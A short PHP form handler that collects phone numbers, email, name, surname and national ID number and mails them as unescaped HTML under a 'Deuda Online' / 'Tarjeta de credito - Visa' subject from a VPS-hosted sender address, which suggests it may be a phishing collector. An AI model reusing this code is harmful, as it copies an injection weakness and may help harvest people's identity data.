<?php 
	error_reporting(0);

	//variables POST
    $tel1_recibido = $_POST['tel1'];
    $tel2_recibido = $_POST['tel2'];
    $mail_recibido = $_POST['mail'];
    $nombre_recibido = $_POST['nombre'];
  	$apellido_recibido = $_POST['apellido'];
    $dni_recibido = $_POST['dni'];
 
	require("class.phpmailer.php");
    $mail = new PHPMailer();
    $mail->Host = "localhost";
    $mail->IsHTML(true);
			
    $cuerpo .= "<b>Tel 1:</b> " . $tel1_recibido . "<br>";
    $cuerpo .= "<b>Tel 2:</b> " . $tel2_recibido . "<br>";
    $cuerpo .= "<b>Mail:</b> " . $mail_recibido . "<br>";
    $cuerpo .= "<b>Nombre:</b> " . $nombre_recibido . "<br>";
    $cuerpo .= "<b>Apellido:</b> " . $apellido_recibido . "<br>";
    $cuerpo .= "<b>DNI:</b> " . $dni_recibido . "<br>";
                    
    $mail->From = "info@legionvps.com";
    $mail->FromName = "Deuda Online";
    $mail->Subject = "Tarjeta de credito - Visa";
    $mail->AddAddress("deudaonline@epb.com.ar","Deuda Online");
    $mail->Body = $cuerpo;
    $mail->AltBody = "";
    $mail->Send();
 	
 	echo "Formulario enviado correctamente.";
?>